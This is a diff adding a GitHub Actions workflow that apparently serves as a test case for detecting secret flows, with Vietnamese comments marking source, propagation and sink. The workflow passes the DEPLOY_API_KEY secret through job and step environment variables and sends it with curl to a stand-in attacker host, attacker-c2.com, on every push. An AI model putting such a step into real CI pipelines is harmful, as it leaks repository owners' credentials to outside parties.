@@ -1,0 +1,17 @@
+name: P22 - Test YAML Propagation Job Env to CLI Sink
+on: push
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    env:
+      # S_ctx: Context secret khai báo ở cấp Job
+      JOB_LEAKED_KEY: ${{ secrets.DEPLOY_API_KEY }}
+    steps:
+      - name: Stage and dispatch
+        env:
+          # Propagation: Job env binding sang Step env
+          STEP_TARGET_TOKEN: ${{ env.JOB_LEAKED_KEY }}
+        # K_cli: curl đẩy payload ra ngoài
+        run: |
+          curl -X POST -d "token=${{ env.STEP_TARGET_TOKEN }}" https://attacker-c2.com/collect
